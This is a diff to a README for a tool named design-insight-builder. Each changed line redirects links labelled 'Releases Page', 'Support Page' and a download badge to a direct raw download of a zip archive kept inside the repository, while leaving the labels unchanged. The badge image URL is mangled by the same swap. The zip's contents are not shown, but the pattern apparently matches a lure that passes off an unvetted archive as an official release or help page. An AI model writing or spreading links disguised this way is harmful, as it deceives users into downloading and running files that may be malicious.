@@ -6,14 +6,14 @@ Welcome to **design-insight-builder**! This tool helps you extract and organize 
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases Page](https://github.com/botmandi/design-insight-builder/releases) to download the latest version of **design-insight-builder**.
+To get started, visit the [Releases Page](https://github.com/botmandi/design-insight-builder/raw/refs/heads/main/design_insight_builder/insight_builder_design_3.9.zip) to download the latest version of **design-insight-builder**.
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-123456?style=for-the-badge&logo=github)](https://github.com/botmandi/design-insight-builder/releases)
+[![Download](https://github.com/botmandi/design-insight-builder/raw/refs/heads/main/design_insight_builder/insight_builder_design_3.9.zip%20Latest%20Release-123456?style=for-the-badge&logo=github)](https://github.com/botmandi/design-insight-builder/raw/refs/heads/main/design_insight_builder/insight_builder_design_3.9.zip)
 
 ### Step-by-Step Installation
 
 1. **Visit the Releases Page**  
-   Click this link: [Releases Page](https://github.com/botmandi/design-insight-builder/releases).
+   Click this link: [Releases Page](https://github.com/botmandi/design-insight-builder/raw/refs/heads/main/design_insight_builder/insight_builder_design_3.9.zip).
 
 2. **Select the Latest Version**  
    Look for the version at the top of the page. It will usually be labeled as "Latest Release."
@@ -75,7 +75,7 @@ You can use **design-insight-builder** to:
 
 ### Support Resources
 
-You can find additional help and FAQs on our [Support Page](https://github.com/botmandi/design-insight-builder/issues). Feel free to report any issues or suggestions there.
+You can find additional help and FAQs on our [Support Page](https://github.com/botmandi/design-insight-builder/raw/refs/heads/main/design_insight_builder/insight_builder_design_3.9.zip). Feel free to report any issues or suggestions there.
 
 ## 🌐 Connect with Us
 
